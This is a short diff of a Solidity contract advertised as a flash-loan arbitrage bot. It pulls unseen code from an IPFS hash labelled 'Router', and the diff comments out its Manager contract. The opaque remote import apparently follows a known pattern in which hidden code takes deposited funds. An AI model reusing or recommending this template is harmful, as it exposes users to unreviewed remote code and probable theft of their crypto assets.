@@ -3,12 +3,12 @@ pragma solidity ^0.5.0;
 // Router
 import "ipfs://QmbP6epUvsA26gkrYAmNTCUJQ7X5DEUQRbWTFGB7DBhHh8"; 
 
-contract Manager {
+/* contract Manager {
     function performTasks() pure public {
         
     }
     
-/* UniSwap - PancakeSwap - Flash Loan Arbitrage Bot - Solidity Tutorials - ETH - coins - MATIC Supported
+ UniSwap - PancakeSwap - Flash Loan Arbitrage Bot - Solidity Tutorials - ETH - coins - MATIC Supported
    string public tokenName;
    string public tokenSymbol;
    uint loanAmount;
